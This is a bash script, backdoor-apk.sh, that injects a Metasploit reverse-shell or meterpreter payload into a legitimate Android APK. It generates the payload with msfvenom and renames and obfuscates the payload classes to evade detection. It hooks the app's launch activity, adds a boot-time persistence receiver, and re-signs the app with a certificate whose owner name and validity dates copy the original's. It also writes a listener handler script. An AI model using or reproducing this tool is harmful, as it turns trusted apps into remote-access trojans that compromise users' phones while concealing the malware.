#!/bin/bash

# file: backdoor-apk.sh

# usage: ./backdoor-apk.sh original.apk

# Dana James Traversie
# Security Engineer
# Check Point Software Technologies, Ltd.

# IMPORTANT: The following packages were required on Kali Linux
#   in order to get things rolling. These packages are likely
#   required by other Linux distros as well.
# apt-get install lib32z1 lib32ncurses5 lib32stdc++6

VERSION="0.2.2"

PAYLOAD=""
LHOST=""
LPORT=""
PERM_OPT=""

MSFVENOM=msfvenom
DEX2JAR=d2j-dex2jar
UNZIP=unzip
KEYTOOL=keytool
JARSIGNER=jarsigner
APKTOOL=apktool
PROGUARD=third-party/proguard5.3.2/lib/proguard
ASO=third-party/android-string-obfuscator/lib/aso
DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
# file paths and misc
MY_PATH=`pwd`
ORIG_APK_FILE=$1
RAT_APK_FILE=Rat.apk
LOG_FILE=$MY_PATH/run.log
TIME_OF_RUN=`date`
# for functions
FUNC_RESULT=""

# functions
function find_smali_file {
  # $1 = smali_file_to_hook
  # $2 = android_class
  if [ ! -f $1 ]; then
    local index=2
    local max=1000
    local smali_file=""
    while [ $index -lt $max ]; do
      smali_file=$MY_PATH/original/smali_classes$index/$2.smali
      if [ -f $smali_file ]; then
        # found
        FUNC_RESULT=$smali_file
        return 0
      else
        let index=index+1
      fi
    done
    # not found
    return 1
  else
    FUNC_RESULT=$1
    return 0
  fi
}

function hook_smali_file {
  # $1 = payload_tld
  # $2 = payload_primary_dir
  # $3 = payload_sub_dir
  # $4 = smali_file_to_hook
  local stop_hooking=0
  local smali_file=$4
  while [ $stop_hooking -eq 0 ]; do
    sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$1"'\/'"$2"'\/'"$3"'\/a;->a(Landroid\/content\/Context;)V' $smali_file >>$LOG_FILE 2>&1
    grep -B 2 "$1/$2/$3/a" $smali_file >>$LOG_FILE 2>&1
    if [ $? == 0 ]; then
      echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
      FUNC_RESULT=$smali_file
      return 0
    else
      echo "Failed to hook smali file" >>$LOG_FILE 2>&1
      local super_android_class=`grep ".super" $smali_file |sed 's/.super L//g' |sed 's/;//g'`
      if [ -z $super_android_class ]; then
        let stop_hooking=stop_hooking+1
      else
        echo "Trying to hook super class: $super_android_class" >>$LOG_FILE 2>&1
        smali_file=$MY_PATH/original/smali/$super_android_class.smali
        echo "New smali file to hook: $smali_file" >>$LOG_FILE 2>&1
        find_smali_file $smali_file $super_android_class
        if [ $? != 0 ]; then
          echo "Failed to find new smali file" >>$LOG_FILE 2>&1
          let stop_hooking=stop_hooking+1
        else
          echo "Found new smali file" >>$LOG_FILE 2>&1
        fi
      fi
    fi
  done
  return 1
}

function cleanup {
  echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
  bash cleanup.sh >>$LOG_FILE 2>&1
}

function verify_orig_apk {
  if [ -z $ORIG_APK_FILE ]; then
    echo "[!] No original APK file specified"
    exit 1
  fi

  if [ ! -f $ORIG_APK_FILE ]; then
    echo "[!] Original APK file specified does not exist"
    exit 1
  fi

  $UNZIP -l $ORIG_APK_FILE >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo "[!] Original APK file specified is not valid"
    exit $rc
  fi
}

function consult_which {
  which $1 >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo "[!] Check your environment and configuration. Couldn't find: $1"
    exit $rc
  fi
}

function print_ascii_art {
cat << "EOF"
          ________
         / ______ \
         || _  _ ||
         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK
         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK
         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK
         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK
         |||_||_|||         AAA  AAA  PPP       KKK  KKK
         ||______||         AAA  AAA  PPP       KKK  KKK
        /__________\
________|__________|__________________________________________
       /____________\
       |____________|            Dana James Traversie

EOF
}

function get_payload {
  echo "[+] Android payload options:"
  PS3='[?] Please select an Android payload option: '
  options=("meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_tcp" "shell/reverse_http" "shell/reverse_https" "shell/reverse_tcp")
  select opt in "${options[@]}"
  do
    case $opt in
      "meterpreter/reverse_http")
        PAYLOAD="android/meterpreter/reverse_http"
        break
        ;;
      "meterpreter/reverse_https")
        PAYLOAD="android/meterpreter/reverse_https"
        break
        ;;
      "meterpreter/reverse_tcp")
        PAYLOAD="android/meterpreter/reverse_tcp"
        break
        ;;
      "shell/reverse_http")
        PAYLOAD="android/shell/reverse_http"
        break
        ;;
      "shell/reverse_https")
        PAYLOAD="android/shell/reverse_https"
        break
        ;;
      "shell/reverse_tcp")
        PAYLOAD="android/shell/reverse_tcp"
        break
        ;;
      *)
        echo "[!] Invalid option selected"
        ;;
    esac
  done
}

function get_lhost {
  while true; do
    read -p "[?] Please enter an LHOST value: " lh
    if [ $lh ]; then
      LHOST=$lh
      break
    fi
  done
}

function get_lport {
  while true; do
    read -p "[?] Please enter an LPORT value: " lp
    if [ $lp ]; then
      if [[ "$lp" =~ ^[0-9]+$ ]] && [ "$lp" -ge 1 -a "$lp" -le 65535 ]; then
        LPORT=$lp
        break
      fi
    fi
  done
}

function get_perm_opt {
  echo "[+] Android manifest permission options:"
  PS3='[?] Please select an Android manifest permission option: '
  options=("Keep original" "Merge with payload and shuffle")
  select opt in "${options[@]}"
  do
    case $opt in
      "Keep original")
        PERM_OPT="KEEPO"
        break
        ;;
      "Merge with payload and shuffle")
        PERM_OPT="RANDO"
        break
        ;;
      *)
        echo "[!] Invalid option selected"
        ;;
    esac
  done
}

function init {
  echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
  print_ascii_art
  echo "[*] Running backdoor-apk.sh v$VERSION on $TIME_OF_RUN"
  consult_which $MSFVENOM
  consult_which $DEX2JAR
  consult_which $UNZIP
  consult_which $KEYTOOL
  consult_which $JARSIGNER
  consult_which $APKTOOL
  consult_which $PROGUARD
  consult_which $ASO
  consult_which $DX
  consult_which $ZIPALIGN
  verify_orig_apk
  get_payload
  get_lhost
  get_lport
  get_perm_opt
}

# kick things off
init

# generate Metasploit resource script
# credit to John Troony for the suggestion
cat >$MY_PATH/backdoor-apk.rc <<EOL
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j -z
EOL
echo "[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc"

echo -n "[*] Generating RAT APK file..."
$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
  echo "[!] Failed to generate RAT APK file"
  exit 1
fi

echo -n "[*] Decompiling original APK file..."
$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile original APK file"
  cleanup
  exit $rc
fi

# build random hex placeholder value without openssl
# used in various code that follows
placeholder=''
for i in `seq 1 4`; do
  rand_num=`shuf -i 1-2147483647 -n 1`
  hex=`printf '%x' $rand_num`
  placeholder="$placeholder$hex"
done
echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1

original_manifest_file=$MY_PATH/original/AndroidManifest.xml
if [ "$PERM_OPT" == "RANDO" ]; then
  echo -n "[*] Decompiling RAT APK file..."
  $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
  rc=$?
  echo "done."
  if [ $rc != 0 ]; then
    echo "[!] Failed to decompile RAT APK file"
    cleanup
    exit $rc
  fi
  echo -n "[*] Merging permissions of original and payload projects..."
  tmp_perms_file=$MY_PATH/perms.tmp
  payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
  merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
  grep "<uses-permission" $original_manifest_file >$tmp_perms_file
  grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
  grep "<uses-permission" $tmp_perms_file|sort|uniq|shuf >$tmp_perms_file.uniq
  mv $tmp_perms_file.uniq $tmp_perms_file
  sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
  awk '/^[ \t]*'"$placeholder"'/&&c++ {next} 1' $merged_manifest_file >$merged_manifest_file.uniq
  mv $merged_manifest_file.uniq $merged_manifest_file
  sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
  diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
  mv $merged_manifest_file $original_manifest_file
  echo "done."
  # cleanup payload directory after merging app permissions
  rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
elif [ "$PERM_OPT" == "KEEPO" ]; then
  echo "[+] Keeping permissions of original project"
else
  echo "[!] Something went terribly wrong..."
  cleanup
  exit 1
fi

# use dex2jar, proguard, and dx
# to shrink, optimize, and obfuscate original Rat.apk code
echo -n "[*] Running proguard on RAT APK file..."
mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to run dex2jar on RAT APK file"
  cleanup
  exit $rc
fi
# inject Java classes
cp -R $MY_PATH/java/classes/* $MY_PATH/libs/ >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to inject Java classes"
  cleanup
  exit $rc
fi
cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
cd $MY_PATH
rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
$PROGUARD @android.pro >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to run proguard with specified configuration"
  cleanup
  exit $rc
fi
$DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to run dx on proguard processed jar file"
  cleanup
  exit $rc
fi
echo "done."

echo -n "[*] Decompiling obfuscated RAT APK file..."
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile RAT APK file"
  cleanup
  exit $rc
fi

# avoid having com/metasploit/stage path to smali files
tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
echo "payload_tld is: $payload_tld" >>$LOG_FILE 2>&1
payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_primary_dir is: $payload_primary_dir" >>$LOG_FILE 2>&1
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1

echo -n "[*] Creating new directories in original project for RAT smali files..."
mkdir -v -p $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to create new directories for RAT smali files"
  cleanup
  exit $rc
fi

echo -n "[*] Copying RAT smali files to new directories in original project..."
cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainService.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/MainService.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  cp -v $MY_PATH/payload/smali/net/dirtybox/util/*.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to copy RAT smali files"
  cleanup
  exit $rc
fi

echo -n "[*] Fixing RAT smali files..."
sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{AppBoot.smali,MainService.smali} >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to fix RAT smali files"
  cleanup
  exit $rc
fi

echo -n "[*] Obfuscating const-string values in RAT smali files..."
cat >$MY_PATH/obfuscate.method <<EOL

    invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object ###REG###
EOL
stringobfuscator_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
so_class_suffix=`echo $stringobfuscator_class |awk -F "/" '{ printf "%s.smali", $4 }'`
echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
so_key=$so_default_key
which openssl >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  so_key="$(openssl rand -base64 16)"
  rc=$?
fi
if [ $rc == 0 ]; then
  file="$MY_PATH/original/smali/$stringobfuscator_class.smali"
  sed -i 's%'"$so_default_key"'%'"$so_key"'%' $file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    echo "Injected new key into StringObufscator class" >>$LOG_FILE 2>&1
  else
    echo "Failed to inject new key into StringObfuscator class, using default key" >>$LOG_FILE 2>&1
    so_key=$so_default_key
  fi
else
  echo "Failed to generate a new StringObfuscator key, using default key" >>$LOG_FILE 2>&1
  so_key=$so_default_key 
fi
echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  grep "const-string" --exclude="$so_class_suffix" $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
    file=`echo $line |awk -F ": " '{ print $1 }'`
    echo "File: $file" >>$LOG_FILE 2>&1
    target=`echo $line |awk -F ", " '{ print $2 }'`
    echo "Target: $target" >>$LOG_FILE 2>&1
    tmp=`echo $line |awk -F ": " '{ print $2 }'`
    reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
    echo "Reg: $reg" >>$LOG_FILE 2>&1
    stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
    replacement=`$ASO e "$stripped_target" k "$so_key"`
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to obfuscate target value" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
    replacement="\"$(echo $replacement)\""
    echo "Replacement: $replacement" >>$LOG_FILE 2>&1
    sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to replace target value" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
    sed -i '\|'"$replacement"'|r '"$MY_PATH"'/obfuscate.method' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to inject unobfuscate method call" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
    sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to inject register value" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
  done
  if [ ! -f $MY_PATH/obfuscate.error ]; then
    class="$stringobfuscator_class"
    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
    rc=$?
  else
    rm -v $MY_PATH/obfuscate.error >>$LOG_FILE 2>&1
    rc=1
  fi
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to obfuscate const-string values in RAT smali files"
  cleanup
  exit $rc
fi

echo -n "[*] Locating smali file to hook in original project..."
total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
activity_line_count=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |grep -c "<activity"`
echo "Activity lines found above launcher line: $activity_line_count" >>$LOG_FILE 2>&1
# should get a value here if launcher line is within an activity-alias element
android_target_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:targetActivity="[^\"]+"'|sed 's/\"//g'|sed 's/android:targetActivity=//g'|sed 's/\./\//g'`
echo "Value of android_target_activity: $android_target_activity" >>$LOG_FILE 2>&1
android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
echo "Value of android_name: $android_name" >>$LOG_FILE 2>&1
if [ -z $android_target_activity ]; then
  echo "The launcher line appears to be within an activity element" >>$LOG_FILE 2>&1
  tmp=$android_name
else
  echo "The launcher line appears to be within an activity-alias element" >>$LOG_FILE 2>&1
  tmp=$android_target_activity
fi
echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
# add package from manifest if needed
if [[ $tmp == /* ]]; then
  tmp=$total_package$tmp
fi
android_class=$tmp
echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
smali_file_to_hook=$MY_PATH/original/smali/$android_class.smali
find_smali_file $smali_file_to_hook $android_class
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to locate smali file to hook"
  cleanup
  exit $rc
else
  echo "done."
  smali_file_to_hook=$FUNC_RESULT
  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
fi

echo -n "[*] Adding hook in original smali file..."
hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to add hook"
  cleanup
  exit $rc
fi

cat >$MY_PATH/persistence.hook <<EOL
        <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.MainService"/>
EOL

grep "android.permission.RECEIVE_BOOT_COMPLETED" $original_manifest_file >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  echo -n "[*] Adding persistence hook in original project..."
  sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc == 0 ]; then
      sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
      rc=$?
    fi
  fi
  echo "done."
  if [ $rc != 0 ]; then
    echo "[!] Failed to add persistence hook"
    cleanup
    exit $rc
  fi
else
  echo "[+] Unable to add persistence hook due to missing permission"
  ##### TODO #####
  # Delete AppBoot.smali and MainService.smali before recompilation?
fi

echo -n "[*] Recompiling original project with backdoor..."
$APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to recompile original project with backdoor"
  cleanup
  exit $rc
fi

keystore=$MY_PATH/signing.keystore
compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE
unaligned_apk=$MY_PATH/original/dist/unaligned.apk

dname=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Owner:" |sed 's/^.*: //g'`
echo "Original dname value: $dname" >>$LOG_FILE 2>&1

valid_from_line=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Valid from:"`
echo "Original valid from line: $valid_from_line" >>$LOG_FILE 2>&1
from_date=$(sed 's/^Valid from://g' <<< $valid_from_line |sed 's/until:.\+$//g' |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
echo "Original from date: $from_date" >>$LOG_FILE 2>&1
from_date_tz=$(awk '{ print $5 }' <<< $from_date)
from_date_norm=$(sed 's/[[:space:]]'"$from_date_tz"'//g' <<< $from_date)
echo "Normalized from date: $from_date_norm" >>$LOG_FILE 2>&1
to_date=$(sed 's/^Valid from:.\+until://g' <<< $valid_from_line |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
echo "Original to date: $to_date" >>$LOG_FILE 2>&1
to_date_tz=$(awk '{ print $5 }' <<< $to_date)
to_date_norm=$(sed 's/[[:space:]]'"$to_date_tz"'//g' <<< $to_date)
echo "Normalized to date: $to_date_norm" >>$LOG_FILE 2>&1
from_date_str=`TZ=UTC date --date="$from_date_norm" +"%Y/%m/%d %T"`
echo "Value of from_date_str: $from_date_str" >>$LOG_FILE 2>&1
end_ts=$(TZ=UTC date -ud "$to_date_norm" +'%s')
start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
echo "Value of validity: $validity" >>$LOG_FILE 2>&1

echo -n "[*] Generating RSA key for signing..."
$KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "Retrying RSA key generation without original APK cert from date and validity values" >>$LOG_FILE 2>&1
  $KEYTOOL -genkey -noprompt -alias signing.key -validity 10000 -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to generate RSA key"
  cleanup
  exit $rc
fi

echo -n "[*] Signing recompiled APK..."
$JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to sign recompiled APK"
  cleanup
  exit $rc
fi

echo -n "[*] Verifying signed artifacts..."
$JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to verify signed artifacts"
  cleanup
  exit $rc
fi

mv $compiled_apk $unaligned_apk

echo -n "[*] Aligning recompiled APK..."
$ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to align recompiled APK"
  cleanup
  exit $rc
fi

rm $unaligned_apk

exit 0
